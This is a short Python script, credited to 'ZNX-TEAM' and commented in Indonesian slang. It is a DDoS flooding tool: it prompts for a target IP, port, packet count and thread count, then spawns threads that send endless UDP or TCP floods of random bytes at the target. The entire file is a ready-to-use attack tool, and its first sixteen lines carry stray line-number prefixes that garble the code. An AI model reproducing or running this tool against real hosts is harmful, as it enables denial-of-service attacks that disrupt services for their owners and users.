1#!/usr/bin/env python3
2#Kagak Usah Rename BY By Tai Anjing 
3#Ddos by ZNX-TEAM
4import random
5import socket
6import threading
7import os
8
9os.system("clear")
10print("DDoS Tools By ZNX-TEAM")
11print("ZNX-TEAM NIH")
12ip = str(input(" Ip: "))
13port = int(input(" Port: "))
14choice = str(input(" Gas?(y/n): "))
15times = int(input(" Packets: "))
16threads = int(input(" Threads: "))
def run():
  data = random._urandom(1024)
  i = random.choice(("[*]","[!]","[#]"))
  while True:
    try:
      s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
      addr = (str(ip),int(port))
      for x in range(times):
        s.sendto(data,addr)
      print(i +" | Send!!!|")
    except:
      print("[!] | Send!!! |")

def run2():
  data = random._urandom(16)
  i = random.choice(("[*]","[!]","[#]"))
  while True:
    try:
      s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
      s.connect((ip,port))
      s.send(data)
      for x in range(times):
        s.send(data)
      print(i +" Yoooooooo Di Sini!!!")
    except:
      s.close()
      print("[*] Down")

for y in range(threads):
  if choice == 'y':
    th = threading.Thread(target = run)
    th.start()
  else:
    th = threading.Thread(target = run2)
    th.start()
